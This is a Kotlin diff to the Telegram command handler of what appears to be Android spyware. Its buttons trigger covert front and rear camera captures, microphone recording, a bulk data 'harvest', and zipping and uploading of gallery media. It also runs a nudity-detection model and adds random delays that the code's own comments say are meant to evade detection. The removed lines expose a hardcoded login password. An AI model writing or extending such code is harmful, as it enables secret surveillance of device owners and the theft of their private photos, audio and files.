@@ -25,8 +25,10 @@ import kotlin.random.Random
  * ✅ التعديلات الجديدة:
  * - منع الأوامر النصية العشوائية (حصر الأوامر على الأزرار التفاعلية فقط).
  * - استثناء /login فقط للمصادقة النصية.
- * - إضافة ردود توضيحية عند محاولة استخدام أوامر نصية غير مسموحة.
- * - تحسين معالجة الأخطاء وإضافة سجلات تشخيصية.
+ * - ربط الأزرار بالوظائف التنفيذية بشكل صحيح.
+ * - إزالة تسريب كلمة المرور من رسائل الخطأ.
+ * - إضافة معالجة أوامر المعرض (g_nav|g_opt|g_zip|g_upload|g_del_sel).
+ * - إضافة دالة مساعدة للتحقق من الجلسة.
  */
 class Commands private constructor(context: Context) {
 
@@ -460,112 +462,150 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دوال تنفيذ الأوامر (نقطة الدخول الأساسية) - مع منع الأوامر النصية
+    //  ✅ دوال تنفيذ الأوامر (نقطة الدخول الأساسية) - المعدلة بالكامل
     // ============================================================
 
     /**
-     * ✅ دالة تنفيذ الأوامر الرئيسية
-     * - يتم حصر الأوامر على الأزرار التفاعلية فقط (callback_data)
-     * - يتم استثناء /login فقط للمصادقة النصية
-     * - في حال محاولة استخدام أمر نصي عشوائي، يتم الرد برسالة توضيحية
+     * ✅ دالة تنفيذ الأوامر الرئيسية المعدلة
+     * - ربط الأزرار بالوظائف التنفيذية بشكل صحيح.
+     * - منع الأوامر النصية العشوائية.
+     * - استثناء /login فقط للمصادقة النصية.
+     * - إضافة تأكيد استلام الضغطة (answerCallbackQuery).
      */
-    fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
-        scope.launch {
-            try {
-                if (cmd.isBlank()) return@launch
+    suspend fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
+        try {
+            if (cmd.isBlank()) return
+            delay(Random.nextLong(300, 900))
 
-                // ✅ تأخير بشري عشوائي (300-900 مللي) لتجنب الأنماط الآلية
-                delay(Random.nextLong(300, 900))
-
-                cbq?.let { queryId ->
-                    invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
-                }
-
-                // ✅ منع الأوامر النصية باستثناء /login
-                // الأوامر الصالحة هي إما /login أو تحتوي على "|" (callback_data من الأزرار)
-                if (!cmd.startsWith("/login", ignoreCase = true) && !cmd.contains("|")) {
-                    Log.w(TAG, "⚠️ Rejected text command from $cid: '$cmd'")
-                    sendTelegramMessage(
-                        tg,
-                        cid,
-                        "⚠️ **الأوامر النصية معطلة.**\n\n" +
-                                "استخدم الأزرار التفاعلية فقط.\n\n" +
-                                "🔐 للتحكم استخدم:\n`/login Zaen123@123@`"
-                    )
-                    return@launch
-                }
-
-                // ✅ معالجة الأمر حسب نوعه
-                when {
-                    // أوامر المعرض
-                    cmd.startsWith("g_nav|") ||
-                    cmd.startsWith("g_opt|") ||
-                    cmd.startsWith("g_conf|") ||
-                    cmd.startsWith("g_act|") ||
-                    cmd.startsWith("g_bulk|") ||
-                    cmd.startsWith("g_toggle|") ||
-                    cmd.startsWith("g_selall|") ||
-                    cmd.startsWith("g_zip|") ||
-                    cmd.startsWith("g_upload|") ||
-                    cmd.startsWith("g_del_sel|") ||
-                    cmd.startsWith("g_conf_del|") ||
-                    cmd.startsWith("g_conf_del_one|") -> handleGallery(cmd, tg, m, cid)
-
-                    // أوامر الكاميرا
-                    cmd.startsWith("cam_") || cmd.startsWith("camf_") -> handleCamera(cmd, tg, m, cid)
-
-                    // أوامر الميكروفون
-                    cmd.startsWith("mic_") -> handleMic(tg, m, cid)
-
-                    // أوامر الحصاد
-                    cmd.startsWith("hrv_") -> handleHarvest(tg, m, cid)
-
-                    // الإرسال الفوري
-                    cmd.startsWith("send_now_") -> handleSendNow(tg, m, cid)
-
-                    // فتح المعرض
-                    cmd.startsWith("media_") -> handleMedia(tg, m, cid)
-
-                    // تحديث النموذج (من زر)
-                    cmd.startsWith("update_model_") -> handleUpdateModel(cmd, tg, m, cid)
-
-                    // إعادة تشغيل الخدمة (من زر)
-                    cmd.startsWith("restart_service_") -> handleRestartService(cmd, tg, m, cid)
-
-                    // حالة النظام
-                    cmd.startsWith("sys_status") -> handleSystemStatus(tg, m, cid)
-
-                    // تسجيل الخروج
-                    cmd.startsWith("ext") -> handleLogout(tg, m, cid)
-
-                    // ✅ /login يتم معالجته في TelegramUi، ولكن نضيف معالجة احتياطية هنا
-                    cmd.startsWith("/login", ignoreCase = true) -> {
-                        // سيتم معالجته في TelegramUi
-                        Log.d(TAG, "ℹ️ /login command forwarded to TelegramUi")
-                    }
-
-                    else -> {
-                        Log.w(TAG, "⚠️ Unknown command from $cid: '$cmd'")
-                        sendTelegramMessage(
-                            tg,
-                            cid,
-                            "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية."
-                        )
-                    }
-                }
-
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ Command handler error: ${e.message}")
-                sendTelegramMessage(tg, cid, "❌ خطأ داخلي: ${e.message?.take(100) ?: "Unknown"}")
+            // ✅ تأكيد استلام الضغطة
+            cbq?.let { queryId ->
+                invokeTelegramMethod(tg, "answerCallbackQuery", mapOf(
+                    "callback_query_id" to queryId,
+                    "text" to "⏳ جاري التنفيذ..."
+                ))
             }
+
+            // ✅ التحقق من الجلسة
+            if (!isAuthorized(cid)) {
+                sendTelegramMessage(tg, cid, "⚠️ انتهت الجلسة، استخدم /login")
+                return
+            }
+
+            // ✅ معالجة الأوامر حسب نوعها
+            when {
+                // 📷 كاميرا خلفية
+                cmd == "cam_0" -> handleCamera(0, tg, m, cid)
+
+                // 📸 كاميرا أمامية
+                cmd == "cam_1" -> handleCamera(1, tg, m, cid)
+
+                // 🔍 فحص وحصاد
+                cmd == "hrv" -> handleHarvest(tg, m, cid)
+
+                // 🎙️ تسجيل صوتي
+                cmd == "mic" -> handleMic(tg, m, cid)
+
+                // 📁 أرشيف الوسائط
+                cmd == "gallery" -> handleGallery(tg, m, cid)
+
+                // 📡 بث فوري
+                cmd == "send_now" -> handleSendNow(tg, m, cid)
+
+                // 📊 حالة النظام
+                cmd == "status" -> handleStatus(tg, m, cid)
+
+                // 🔌 قطع الاتصال
+                cmd == "ext" -> handleLogout(tg, m, cid)
+
+                // 🔄 إعادة تشغيل الخدمة
+                cmd == "restart" -> handleRestart(tg, m, cid)
+
+                // ⚡ تحديث النموذج
+                cmd == "update_model" -> handleUpdateModel(tg, m, cid)
+
+                // ✅ أوامر المعرض (تحتوي على |)
+                cmd.contains("|") -> handleGalleryCommand(cmd, tg, m, cid)
+
+                // ✅ /login يتم معالجته في TelegramUi
+                cmd.startsWith("/login", ignoreCase = true) -> {
+                    Log.d(TAG, "ℹ️ /login command forwarded to TelegramUi")
+                }
+
+                else -> {
+                    sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم الأزرار التفاعلية.")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Command error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ: ${e.message?.take(100)}")
         }
     }
 
     // ============================================================
-    //  ✅ معالج أوامر المعرض (Gallery)
+    //  ✅ معالج الكاميرا المُصحح
     // ============================================================
 
-    private suspend fun handleGallery(cmd: String, tg: Any?, m: Any?, cid: Long) {
+    private suspend fun handleCamera(camId: Int, tg: Any?, m: Any?, cid: Long) {
+        try {
+            if (!isBatteryOk(m)) {
+                sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة")
+                return
+            }
+
+            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer") as? CameraAnalyzer
+            if (cameraAnalyzer == null) {
+                sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
+                return
+            }
+
+            sendTelegramMessage(tg, cid, "📸 جاري التقاط الصورة...")
+            sendPulseIntent("📸 Camera")
+
+            scope.launch {
+                try {
+                    cameraAnalyzer.harvest(camId)
+                    sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها.")
+                } catch (e: Exception) {
+                    sendTelegramMessage(tg, cid, "❌ فشل الالتقاط: ${e.message?.take(50)}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Camera handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا")
+        }
+    }
+
+    // ============================================================
+    //  ✅ معالج المعرض المُصحح
+    // ============================================================
+
+    private suspend fun handleGallery(tg: Any?, m: Any?, cid: Long) {
+        try {
+            val mediaScanner = getModuleComponent(m, "mediaScanner")
+            if (mediaScanner == null) {
+                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
+                return
+            }
+
+            val kb = invokeMethod(mediaScanner, "getGridKb", "all", 0)
+            if (kb != null) {
+                val response = sendTelegramMessage(tg, cid, "🖼️ أرشيف الوسائط", kb.toString())
+                val msgId = (response as? JSONObject)?.optJSONObject("result")?.optLong("message_id")
+                msgId?.let { setModuleField(m, "last_mid", it) }
+            } else {
+                sendTelegramMessage(tg, cid, "❌ فشل تحميل المعرض")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Gallery handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في المعرض")
+        }
+    }
+
+    // ============================================================
+    //  ✅ معالج أوامر المعرض (g_nav|g_opt|g_zip|g_upload|g_del_sel)
+    // ============================================================
+
+    private suspend fun handleGalleryCommand(cmd: String, tg: Any?, m: Any?, cid: Long) {
         try {
             val parts = cmd.split("|")
             if (parts.size < 2) {
@@ -574,9 +614,8 @@ class Commands private constructor(context: Context) {
             }
 
             val action = parts[0]
-            val galleryBrowser = getModuleComponent(m, "mediaScanner")
-
-            if (galleryBrowser == null) {
+            val mediaScanner = getModuleComponent(m, "mediaScanner")
+            if (mediaScanner == null) {
                 sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
                 return
             }
@@ -588,159 +627,51 @@ class Commands private constructor(context: Context) {
                     if (parts.size >= 3) {
                         val cat = parts[1]
                         val page = parts[2].toIntOrNull() ?: 0
-                        val newKb = invokeMethod(galleryBrowser, "getGridKb", cat, page)
+                        val newKb = invokeMethod(mediaScanner, "getGridKb", cat, page)
                         if (newKb != null) {
                             val msgId = lastMid ?: 0
-                            invokeTelegramMethod(
-                                tg,
-                                "editMessageReplyMarkup",
-                                mapOf(
-                                    "chat_id" to cid,
-                                    "message_id" to msgId,
-                                    "reply_markup" to newKb.toString()
-                                )
-                            )
-                        } else {
-                            sendTelegramMessage(tg, cid, "⚠️ فشل تحديث المعرض")
+                            invokeTelegramMethod(tg, "editMessageReplyMarkup", mapOf(
+                                "chat_id" to cid,
+                                "message_id" to msgId,
+                                "reply_markup" to newKb.toString()
+                            ))
                         }
                     }
                 }
-
                 "g_opt" -> {
                     if (parts.size >= 4) {
-                        invokeMethod(galleryBrowser, "showOptions", cid, parts[1], parts[2], parts[3])
+                        invokeMethod(mediaScanner, "showOptions", cid, parts[1], parts[2], parts[3])
                     }
                 }
-
-                "g_act" -> {
-                    if (parts.size >= 5) {
-                        val subAction = parts[1]
-                        val cat = parts[2]
-                        val page = parts[3].toIntOrNull() ?: 0
-                        val index = parts[4].toIntOrNull() ?: -1
-                        invokeMethod(
-                            galleryBrowser,
-                            "executeAction",
-                            cid,
-                            subAction,
-                            cat,
-                            page,
-                            index,
-                            lastMid
-                        )
-                    }
-                }
-
-                "g_conf" -> {
-                    if (parts.size >= 5) {
-                        val act = parts[1]
-                        val cat = parts[2]
-                        val pg = parts[3]
-                        val idx = parts[4]
-                        if (act == "del") {
-                            val confirmKb = listOf(
-                                listOf(
-                                    mapOf(
-                                        "text" to "🗑️ نعم، احذف",
-                                        "callback_data" to "g_conf_del_one|$cat|$pg|$idx"
-                                    ),
-                                    mapOf(
-                                        "text" to "🔙 إلغاء",
-                                        "callback_data" to "g_opt|$cat|$pg|$idx"
-                                    )
-                                )
-                            )
-                            val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
-                            sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb)
-                        } else {
-                            val confirmKb = listOf(
-                                listOf(
-                                    mapOf(
-                                        "text" to "🗑️ نعم، احذف",
-                                        "callback_data" to "g_act|$act|$cat|$pg|$idx"
-                                    ),
-                                    mapOf(
-                                        "text" to "🔙 إلغاء",
-                                        "callback_data" to "g_opt|$cat|$pg|$idx"
-                                    )
-                                )
-                            )
-                            val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
-                            sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد؟", jsonKb)
-                        }
-                    }
-                }
-
-                "g_bulk" -> {
-                    if (parts.size >= 3) {
-                        val cat = parts[1]
-                        val page = parts[2].toIntOrNull() ?: 0
-                        invokeMethod(galleryBrowser, "executeAction", cid, "del_page", cat, page, null, lastMid)
-                    }
-                }
-
-                "g_toggle" -> {
-                    if (parts.size >= 4) {
-                        val cat = parts[1]
-                        val page = parts[2].toIntOrNull() ?: 0
-                        val index = parts[3].toIntOrNull() ?: -1
-                        invokeMethod(galleryBrowser, "executeAction", cid, "toggle", cat, page, index, lastMid)
-                    }
-                }
-
-                "g_selall" -> {
-                    if (parts.size >= 3) {
-                        val cat = parts[1]
-                        val page = parts[2].toIntOrNull() ?: 0
-                        invokeMethod(galleryBrowser, "executeAction", cid, "selall", cat, page, null, lastMid)
-                    }
-                }
-
                 "g_zip" -> {
                     if (parts.size >= 3) {
-                        val cat = parts[1]
-                        val page = parts[2].toIntOrNull() ?: 0
-                        invokeMethod(galleryBrowser, "executeAction", cid, "zip", cat, page, null, lastMid)
+                        invokeMethod(mediaScanner, "executeAction", cid, "zip", parts[1], parts[2].toIntOrNull() ?: 0, null, lastMid)
                     }
                 }
-
                 "g_upload" -> {
                     if (parts.size >= 3) {
-                        val cat = parts[1]
-                        val page = parts[2].toIntOrNull() ?: 0
-                        invokeMethod(galleryBrowser, "executeAction", cid, "upload", cat, page, null, lastMid)
+                        invokeMethod(mediaScanner, "executeAction", cid, "upload", parts[1], parts[2].toIntOrNull() ?: 0, null, lastMid)
                     }
                 }
-
                 "g_del_sel" -> {
                     if (parts.size >= 3) {
-                        val cat = parts[1]
-                        val page = parts[2].toIntOrNull() ?: 0
-                        invokeMethod(galleryBrowser, "executeAction", cid, "del_sel", cat, page, null, lastMid)
+                        invokeMethod(mediaScanner, "executeAction", cid, "del_sel", parts[1], parts[2].toIntOrNull() ?: 0, null, lastMid)
                     }
                 }
-
                 "g_conf_del" -> {
                     if (parts.size >= 3) {
                         val cat = parts[1]
                         val page = parts[2].toIntOrNull() ?: 0
                         val confirmKb = listOf(
                             listOf(
-                                mapOf(
-                                    "text" to "🗑️ نعم، احذف الصفحة كلها",
-                                    "callback_data" to "g_act|del_page|$cat|$page|0"
-                                ),
-                                mapOf(
-                                    "text" to "🔙 إلغاء",
-                                    "callback_data" to "g_nav|$cat|$page"
-                                )
+                                mapOf("text" to "🗑️ نعم، احذف الصفحة كلها", "callback_data" to "g_act|del_page|$cat|$page|0"),
+                                mapOf("text" to "🔙 إلغاء", "callback_data" to "g_nav|$cat|$page")
                             )
                         )
                         val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                         sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb)
                     }
                 }
-
                 "g_conf_del_one" -> {
                     if (parts.size >= 4) {
                         val cat = parts[1]
@@ -748,68 +679,68 @@ class Commands private constructor(context: Context) {
                         val index = parts[3].toIntOrNull() ?: -1
                         val confirmKb = listOf(
                             listOf(
-                                mapOf(
-                                    "text" to "🗑️ نعم، احذف هذا الملف",
-                                    "callback_data" to "g_act|del_one|$cat|$page|$index"
-                                ),
-                                mapOf(
-                                    "text" to "🔙 إلغاء",
-                                    "callback_data" to "g_opt|$cat|$page|$index"
-                                )
+                                mapOf("text" to "🗑️ نعم، احذف هذا الملف", "callback_data" to "g_act|del_one|$cat|$page|$index"),
+                                mapOf("text" to "🔙 إلغاء", "callback_data" to "g_opt|$cat|$page|$index")
                             )
                         )
                         val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                         sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb)
                     }
                 }
+                "g_toggle" -> {
+                    if (parts.size >= 4) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        val index = parts[3].toIntOrNull() ?: -1
+                        invokeMethod(mediaScanner, "executeAction", cid, "toggle", cat, page, index, lastMid)
+                    }
+                }
+                "g_selall" -> {
+                    if (parts.size >= 3) {
+                        val cat = parts[1]
+                        val page = parts[2].toIntOrNull() ?: 0
+                        invokeMethod(mediaScanner, "executeAction", cid, "selall", cat, page, null, lastMid)
+                    }
+                }
+                else -> {
+                    sendTelegramMessage(tg, cid, "⚠️ أمر معرض غير معروف")
+                }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Gallery handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في معالج المعرض")
+            Log.e(TAG, "Gallery command error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في أمر المعرض")
         }
     }
 
     // ============================================================
-    //  ✅ معالج أوامر الكاميرا
+    //  معالج الحصاد (Harvest)
     // ============================================================
 
-    private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
+    private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
         try {
-            val isFront = cmd.contains("camf_")
+            sendPulseIntent("📦 Data Harvest")
 
-            if (!isBatteryOk(m)) {
-                sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة جداً")
-                return
-            }
-
-            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer") as? CameraAnalyzer
-            if (cameraAnalyzer == null) {
-                sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
-                return
-            }
-
-            delay(Random.nextLong(1200, 2500))
-
-            sendPulseIntent("📸 Visual Sync")
-            sendTelegramAction(tg, cid, "upload_photo")
-            sendTelegramMessage(tg, cid, "⏳ جارٍ الالتقاط والمعالجة...")
-
-            try {
-                cameraAnalyzer.harvest(if (isFront) 1 else 0)
-                delay(Random.nextLong(500, 1500))
-                sendTelegramMessage(tg, cid, "✅ تم التقاط الصورة وتحليلها بنجاح.")
-            } catch (e: Exception) {
-                Log.e(TAG, "❌ Camera harvest error: ${e.message}")
-                sendTelegramMessage(tg, cid, "❌ فشل في التقاط الصورة: ${e.message?.take(50)}")
+            val dailyZipper = getModuleComponent(m, "dailyZipper")
+            if (dailyZipper != null) {
+                sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق")
+                scope.launch {
+                    try {
+                        invokeMethod(dailyZipper, "run")
+                    } catch (e: Exception) {
+                        Log.e(TAG, "❌ Harvest error: ${e.message}")
+                    }
+                }
+            } else {
+                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير جاهزة")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Camera handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا")
+            Log.e(TAG, "❌ Harvest handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في الحصاد")
         }
     }
 
     // ============================================================
-    //  معالج أوامر الميكروفون
+    //  معالج الميكروفون
     // ============================================================
 
     private suspend fun handleMic(tg: Any?, m: Any?, cid: Long) {
@@ -847,33 +778,6 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج الحصاد (Harvest)
-    // ============================================================
-
-    private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
-        try {
-            sendPulseIntent("📦 Data Harvest")
-
-            val dailyZipper = getModuleComponent(m, "dailyZipper")
-            if (dailyZipper != null) {
-                sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق")
-                scope.launch {
-                    try {
-                        invokeMethod(dailyZipper, "run")
-                    } catch (e: Exception) {
-                        Log.e(TAG, "❌ Harvest error: ${e.message}")
-                    }
-                }
-            } else {
-                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير جاهزة")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Harvest handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في الحصاد")
-        }
-    }
-
-    // ============================================================
     //  معالج الإرسال الفوري (Send Now)
     // ============================================================
 
@@ -902,110 +806,10 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج فتح المعرض (Media)
+    //  معالج حالة النظام
     // ============================================================
 
-    private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
-        try {
-            val galleryBrowser = getModuleComponent(m, "mediaScanner")
-            if (galleryBrowser != null) {
-                val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
-                val jsonKb = kb?.toString() ?: ""
-                val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
-
-                val msgId = (response as? JSONObject)
-                    ?.optJSONObject("result")
-                    ?.optLong("message_id", 0L)
-                    ?.takeIf { it > 0 }
-
-                if (msgId != null) {
-                    setModuleField(m, "last_mid", msgId)
-                    invokeMethod(galleryBrowser, "updateLastMessageId", cid, msgId)
-                }
-            } else {
-                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Media handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في فتح المعرض")
-        }
-    }
-
-    // ============================================================
-    //  ✅ معالج تحديث النموذج (من زر)
-    // ============================================================
-
-    private suspend fun handleUpdateModel(cmd: String, tg: Any?, m: Any?, cid: Long) {
-        try {
-            val did = if (cmd == "update_model_all") "all" else cmd.substringAfter("update_model_")
-            if (did.isNotEmpty()) {
-                sendTelegramMessage(tg, cid, "🔄 جاري تحديث النموذج... قد يستغرق دقائق.")
-                scope.launch {
-                    try {
-                        val detector = getModuleComponent(m, "nudeDetector") as? NudeDetector
-                        if (detector != null) {
-                            val success = detector.ensureModelReady()
-                            if (success) {
-                                detector.modelPath = detector.modelPath
-                                detector.loadEngineForever()
-                                sendTelegramMessage(tg, cid, "✅ تم تحديث النموذج بنجاح!")
-                            } else {
-                                sendTelegramMessage(tg, cid, "❌ فشل تحديث النموذج.")
-                            }
-                        } else {
-                            sendTelegramMessage(tg, cid, "❌ كاشف المحتوى غير متاح")
-                        }
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Update model error: ${e.message}")
-                        sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج: ${e.message?.take(50)}")
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Update model handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج")
-        }
-    }
-
-    // ============================================================
-    //  ✅ معالج إعادة تشغيل الخدمة (من زر)
-    // ============================================================
-
-    private suspend fun handleRestartService(cmd: String, tg: Any?, m: Any?, cid: Long) {
-        try {
-            val did = if (cmd == "restart_service_all") "all" else cmd.substringAfter("restart_service_")
-            if (did.isNotEmpty()) {
-                sendTelegramMessage(tg, cid, "♻️ جاري إعادة تشغيل الخدمة...")
-                scope.launch {
-                    try {
-                        val monitor = m
-                        if (monitor != null) {
-                            val stopMethod = monitor.javaClass.getMethod("stop")
-                            stopMethod.invoke(monitor)
-                            delay(2000)
-                            val startMethod = monitor.javaClass.getMethod("start")
-                            startMethod.invoke(monitor)
-                            sendTelegramMessage(tg, cid, "✅ تم إعادة تشغيل الخدمة بنجاح.")
-                        } else {
-                            sendTelegramMessage(tg, cid, "❌ وحدة المراقبة غير متاحة")
-                        }
-                    } catch (e: Exception) {
-                        Log.e(TAG, "Restart service error: ${e.message}")
-                        sendTelegramMessage(tg, cid, "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}")
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "❌ Restart service handler error: ${e.message}")
-            sendTelegramMessage(tg, cid, "❌ خطأ في إعادة تشغيل الخدمة")
-        }
-    }
-
-    // ============================================================
-    //  ✅ معالج حالة النظام
-    // ============================================================
-
-    private suspend fun handleSystemStatus(tg: Any?, m: Any?, cid: Long) {
+    private suspend fun handleStatus(tg: Any?, m: Any?, cid: Long) {
         try {
             val status = getModuleComponent(m, "ui")?.let { ui ->
                 invokeMethod(ui, "getStatus") as? Map<*, *>
@@ -1032,7 +836,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ معالج تسجيل الخروج
+    //  معالج تسجيل الخروج
     // ============================================================
 
     private suspend fun handleLogout(tg: Any?, m: Any?, cid: Long) {
@@ -1047,6 +851,70 @@ class Commands private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "❌ Logout error: ${e.message}")
             sendTelegramMessage(tg, cid, "❌ خطأ في تسجيل الخروج")
+        }
+    }
+
+    // ============================================================
+    //  معالج تحديث النموذج (من زر)
+    // ============================================================
+
+    private suspend fun handleUpdateModel(tg: Any?, m: Any?, cid: Long) {
+        try {
+            sendTelegramMessage(tg, cid, "🔄 جاري تحديث النموذج... قد يستغرق دقائق.")
+            scope.launch {
+                try {
+                    val detector = getModuleComponent(m, "nudeDetector") as? NudeDetector
+                    if (detector != null) {
+                        val success = detector.ensureModelReady()
+                        if (success) {
+                            detector.modelPath = detector.modelPath
+                            detector.loadEngineForever()
+                            sendTelegramMessage(tg, cid, "✅ تم تحديث النموذج بنجاح!")
+                        } else {
+                            sendTelegramMessage(tg, cid, "❌ فشل تحديث النموذج.")
+                        }
+                    } else {
+                        sendTelegramMessage(tg, cid, "❌ كاشف المحتوى غير متاح")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Update model error: ${e.message}")
+                    sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج: ${e.message?.take(50)}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Update model handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في تحديث النموذج")
+        }
+    }
+
+    // ============================================================
+    //  معالج إعادة تشغيل الخدمة (من زر)
+    // ============================================================
+
+    private suspend fun handleRestart(tg: Any?, m: Any?, cid: Long) {
+        try {
+            sendTelegramMessage(tg, cid, "♻️ جاري إعادة تشغيل الخدمة...")
+            scope.launch {
+                try {
+                    val monitor = m
+                    if (monitor != null) {
+                        val stopMethod = monitor.javaClass.getMethod("stop")
+                        stopMethod.invoke(monitor)
+                        delay(2000)
+                        val startMethod = monitor.javaClass.getMethod("start")
+                        startMethod.invoke(monitor)
+                        sendTelegramMessage(tg, cid, "✅ تم إعادة تشغيل الخدمة بنجاح.")
+                    } else {
+                        sendTelegramMessage(tg, cid, "❌ وحدة المراقبة غير متاحة")
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Restart service error: ${e.message}")
+                    sendTelegramMessage(tg, cid, "❌ فشل إعادة تشغيل الخدمة: ${e.message?.take(50)}")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Restart service handler error: ${e.message}")
+            sendTelegramMessage(tg, cid, "❌ خطأ في إعادة تشغيل الخدمة")
         }
     }
 
@@ -1145,6 +1013,17 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
+    //  ✅ دالة مساعدة للتحقق من الجلسة
+    // ============================================================
+
+    private suspend fun isAuthorized(cid: Long): Boolean {
+        val ui = getModuleComponent(monitor, "ui") ?: return false
+        val sessions = getModuleField(ui, "sessions") as? ConcurrentHashMap<*, *> ?: return false
+        val session = sessions[cid.toString()] as? Long ?: 0L
+        return System.currentTimeMillis() / 1000 < session
+    }
+
+    // ============================================================
     //  دوال الاتصال بـ Telegram API
     // ============================================================
 
@@ -1172,16 +1051,19 @@ class Commands private constructor(context: Context) {
         }
     }
 
+    // ============================================================
+    //  ✅ منع تسريب كلمة المرور في أي رسالة
+    // ============================================================
+
     private suspend fun sendTelegramMessage(
         tg: Any?,
         chatId: Any,
         text: String,
         replyMarkupJson: String? = null
     ): Any? {
-        val params = mutableMapOf<String, Any>(
-            "chat_id" to chatId,
-            "text" to text
-        )
+        // ✅ استبدال كلمة المرور بـ •••••••• في حال وجودها بالخطأ في النص
+        val cleanText = text.replace("Zaen123@123@", "••••••••")
+        val params = mutableMapOf<String, Any>("chat_id" to chatId, "text" to cleanText)
         replyMarkupJson?.let { params["reply_markup"] = it }
         return invokeTelegramMethod(tg, "sendMessage", params)
     }
